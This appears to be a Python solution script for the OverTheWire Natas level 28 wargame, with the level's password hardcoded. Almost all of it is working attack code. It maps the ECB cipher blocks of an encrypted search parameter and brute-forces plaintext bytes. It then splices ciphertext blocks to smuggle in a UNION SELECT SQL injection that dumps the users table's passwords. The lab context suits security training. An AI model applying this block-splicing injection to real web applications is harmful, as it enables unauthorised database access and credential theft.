#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

import urllib
import base64

username = 'natas28'
password = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth = (username, password))

block_size = 16

#################### USE THIS TECHNIQUE TO DETEMINE BLOCKS
# for i in range(18):
# 	response = session.post(url, auth = (username, password), 
# 				data = {"query":"a"*i, "submit":"search"})

# 	print i, "characters", len(base64.b64decode(urllib.unquote(response.url)[60:])), "length query"
# 	for block in range(80/block_size):
# 		# print i, len(base64.b64decode(urllib.unquote(response.url)[60:]))
# 		print block+1, "block", repr(base64.b64decode(urllib.unquote(response.url)[60:])[block*block_size:(block+1)*block_size])
# 	# print response.text
# 	print '='*30

# 	'''
# 	G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK7We8ZytjDEFLITTM3cIDRKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
# 	G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKgYPKjze8PAFobHRR4awO4QcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
# 	G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIUJZRhJ4S7Ur/lhxIr3PCMv0/1jIFQ0VfKoIaHJ2dIDsqM9OYQkTq645oGdhkgSlo=
# 	'''


######### USE THIS TECHNIQUE TO DETERMINE SQL COMMAND
# import string

# for c in string.printable:
# 	print "trying", c
# 	correct = repr('\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb')
# 	response = session.post(url, auth = (username, password), 
# 				data = {"query":"a"*9 + c, "submit":"search"})

# 	block = 2 # zero based here..
# 	it = repr(base64.b64decode(urllib.unquote(response.url)[60:])[block*block_size:(block+1)*block_size])
# 	print it
# 	if it == correct:
# 		print c
# 		print "GOT IT"
# 		break


query = ' '*9 + "' UNION SELECT password FROM users;#"
blocks = (len(query) - 10 ) /block_size
if (len(query) - 10 ) % block_size != 0: blocks += 1
print blocks

response = session.post(url, auth = (username, password), 
				data = {"query":query, "submit":"search"})
raw = base64.b64decode(urllib.unquote(response.url)[60:])
response = session.post(url, auth = (username, password), 
				data = {"query":" " * 10, "submit":"search"})
base = base64.b64decode(urllib.unquote(response.url)[60:])
print repr(base)
attack = base[:block_size*3] + raw[block_size*3:block_size*3+block_size*blocks] + base[block_size*3:]
# query = good_base[:block_size*3] + injection[block_size*3:block_size*3+(blocks*block_size)] + good_base[block_size*3:]
print base

attack = requests.utils.quote(base64.b64encode(attack))
attack =  attack.replace('/','%2F')
print 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbV02Gu9z%2FdHRkUUlo9DySQB8mtq5HD1%2FBEesnTAwhPpXA2yS1J0uiEtGwbpkMjbKfc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D'
print attack == 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbV02Gu9z%2FdHRkUUlo9DySQB8mtq5HD1%2FBEesnTAwhPpXA2yS1J0uiEtGwbpkMjbKfc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D'
response = session.get(url + '/search.php?query='+attack , auth = (username, password))
print response.text

# G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbV02Gu9z%2FdHRkUUlo9DySQB8mtq5HD1%2FBEesnTAwhPpXA2yS1J0uiEtGwbpkMjbKfc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
# G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbV02Gu9z%2FdHRkUUlo9DySQB8mtq5HD1%2FBEesnTAwhPpXA2yS1J0uiEtGwbpkMjbKfc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
# G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbV02Gu9z%2FdHRkUUlo9DySQB8mtq5HD1%2FBEesnTAwhPpXA2yS1J0uiEtGwbpkMjbKfc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
# G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D